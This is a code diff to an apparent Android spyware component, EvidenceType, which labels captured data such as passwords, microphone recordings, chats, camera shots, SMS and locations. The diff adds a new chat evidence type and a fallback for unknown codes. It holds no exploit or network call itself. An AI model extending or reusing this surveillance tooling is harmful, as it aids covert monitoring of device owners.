@@ -13,12 +13,15 @@ import java.util.HashMap;
 import java.util.Map;
 
 import com.android.networking.auto.Cfg;
+import com.android.networking.util.Check;
 
 /**
  * The Class EvidenceType.
  */
 public class EvidenceType {
 
+	private static final String TAG = "EvidenceType";
+	
 	/** The UNKNOWN. */
 	public final static int UNKNOWN = 0xFFFF; // in caso di errore
 	/** The NONE. */
@@ -79,6 +82,9 @@ public class EvidenceType {
 
 	/** The Constant CHAT. */
 	public final static int CHAT = 0xC6C6;
+	
+	/** The Constant CHAT. */
+	public final static int CHATNEW = 0xC6C7;
 
 	/** The Constant CAMSHOT. */
 	public final static int CAMSHOT = 0xE9E9;
@@ -163,6 +169,7 @@ public class EvidenceType {
 			values.put(PASSWORD, "PASSWORD"); //$NON-NLS-1$
 			values.put(MIC, "MIC"); //$NON-NLS-1$
 			values.put(CHAT, "CHAT"); //$NON-NLS-1$
+			values.put(CHATNEW, "CHATNEW"); //$NON-NLS-1$
 			values.put(CAMSHOT, "CAMSHOT"); //$NON-NLS-1$
 			values.put(ADDRESSBOOK, "ADDRESSBOOK"); //$NON-NLS-1$
 			values.put(CALENDAR, "CALENDAR"); //$NON-NLS-1$
@@ -171,7 +178,7 @@ public class EvidenceType {
 			values.put(SMS, "SMS"); //$NON-NLS-1$
 			values.put(MMS, "MMS"); //$NON-NLS-1$
 			values.put(LOCATION, "LOCATION"); //$NON-NLS-1$
-			values.put(CALLLIST, "CALLLIST"); //$NON-NLS-1$
+			values.put(CALLLIST, "LISTCALL"); //$NON-NLS-1$
 			values.put(DEVICE, "DEVICE"); //$NON-NLS-1$
 			values.put(INFO, "INFO"); //$NON-NLS-1$
 			values.put(APPLICATION, "APPLICATION"); //$NON-NLS-1$
@@ -183,7 +190,16 @@ public class EvidenceType {
 			values.put(COMMAND, "COMMAND"); //$NON-NLS-1$
 		}
 
-		return values.get(value);
+		if(values.containsKey(value)){
+			return values.get(value);
+		}else{
+			if (Cfg.DEBUG) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getValue), unknown: " + value);
+				}
+			}
+			return "UNKNOWN";
+		}
 	}
 
 
